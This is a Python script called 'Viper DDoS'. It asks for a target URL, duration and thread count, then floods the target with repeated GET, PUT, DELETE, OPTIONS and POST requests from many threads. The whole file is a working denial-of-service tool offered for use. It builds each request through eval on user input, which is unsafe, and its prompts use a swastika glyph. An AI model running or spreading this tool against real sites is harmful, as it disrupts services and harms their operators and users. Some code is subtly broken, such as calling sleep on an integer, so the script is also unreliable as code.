import os
import requests
from tqdm import tqdm
from sys import version
from threading import Thread
from colorama import Fore

version = "1.3"

babat = "clear"

os.system(f'{babat}') 

loop = tqdm(total = 10000, position=0, leave=False)
for k in range(10000):
    loop.set_description(f'{Fore.RED}[Viper]{Fore.RESET} Loading.....'.format(k))
    loop.update(1)
loop.close()    

os.system(f'{babat}') 

def menu():
    print(f'''     
{Fore.LIGHTMAGENTA_EX}                                (     (         )   (     
{Fore.LIGHTMAGENTA_EX}                                )\ )  )\ )   ( /(   )\ )  
{Fore.LIGHTMAGENTA_EX} (   (   (            (   (    (()/( (()/(   )\()) (()/(  
{Fore.LIGHTMAGENTA_EX} )\  )\  )\  `  )    ))\  )(    /(_)) /(_)) ((_)\   /(_)) 
{Fore.LIGHTMAGENTA_EX}((_)((_)((_) /(/(   /((_)(()\  (_))_ (_))_    ((_) (_))   
{Fore.LIGHTMAGENTA_EX}\ \ / /  (_)((_)_\ (_))   ((_)  |   \ |   \  / _ \ / __|  
{Fore.LIGHTMAGENTA_EX} \ V /   | || '_ \)/ -_) | '_|  | |) || |) || (_) |\__ \  
{Fore.LIGHTMAGENTA_EX}  \_/    |_|| .__/ \___| |_|    |___/ |___/  \___/ |___/  
{Fore.LIGHTMAGENTA_EX}            |_|                                           

              {Fore.RED}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
              {Fore.RED}│  Viper DDoS Version : {version}  │
              {Fore.RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    {Fore.RESET} ''')

menu()

def menu2(): 
    print(f'''    
				{Fore.LIGHTMAGENTA_EX}                                (     (         )   (     
				{Fore.LIGHTMAGENTA_EX}                                )\ )  )\ )   ( /(   )\ )  
				{Fore.LIGHTMAGENTA_EX} (   (   (            (   (    (()/( (()/(   )\()) (()/(  
				{Fore.LIGHTMAGENTA_EX} )\  )\  )\  `  )    ))\  )(    /(_)) /(_)) ((_)\   /(_)) 
				{Fore.LIGHTMAGENTA_EX}((_)((_)((_) /(/(   /((_)(()\  (_))_ (_))_    ((_) (_))   
				{Fore.LIGHTMAGENTA_EX}\ \ / /  (_)((_)_\ (_))   ((_)  |   \ |   \  / _ \ / __|  
				{Fore.LIGHTMAGENTA_EX} \ V /   | || '_ \)/ -_) | '_|  | |) || |) || (_) |\__ \  
				{Fore.LIGHTMAGENTA_EX}  \_/    |_|| .__/ \___| |_|    |___/ |___/  \___/ |___/  
				{Fore.LIGHTMAGENTA_EX}            |_|       

                                                Version : {version}
                                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
                                      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
	{Fore.RESET} ''')

global url, time, file

url = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Viper DDoS"+Fore.BLUE+"~"+Fore.WHITE+"@Target Url"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 ")

time    = int(input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Viper DDoS"+Fore.BLUE+"~"+Fore.WHITE+"@Time"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "))

threads = int(input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"Viper DDoS"+Fore.BLUE+"~"+Fore.WHITE+"@Packet"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "))

loop = tqdm(total = 10000, position=0, leave=False)
for k in range(10000):
    loop.set_description(f'{Fore.RED}[Viper]{Fore.RESET} Waiting To Run Script ........'.format(k))
    loop.update(1)
loop.close()    

os.system(f'{babat}') 

menu2()

global breakFlag
breakFlag = False

print(f'{Fore.BLUE} Sending Packet to : {Fore.RED}{url}')

def attack(request):
	global url, time, file
	i = 0
	while True:
		try:
			req = eval("requests."+request+"('"+url+"')")
			print(f'{Fore.GREEN}[+]{Fore.RED} Sending Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.BLUE}{threads}')
		except:
			print(f'{Fore.RED}[-]{Fore.BLUE} Atack Has Ben Errored')
		i+=1
		if time != 0:
			if i>time:
				break

def createThreadings():
	global breakFlag
	try:
		Thread(target=lambda: attack("get")).start()
		Thread(target=lambda: attack("put")).start()
		Thread(target=lambda: attack("delete")).start()
		Thread(target=lambda: attack("options")).start()
		Thread(target=lambda: attack("post")).start()
	except:
		breakFlag = True

if(threads != 0):
	for i in range(threads):
		createThreadings()
else:
	while True:
		createThreadings()
		if(breakFlag):
			break

while True:
	time.sleep(3)
	os.system(f'{babat}')
	print(menu2)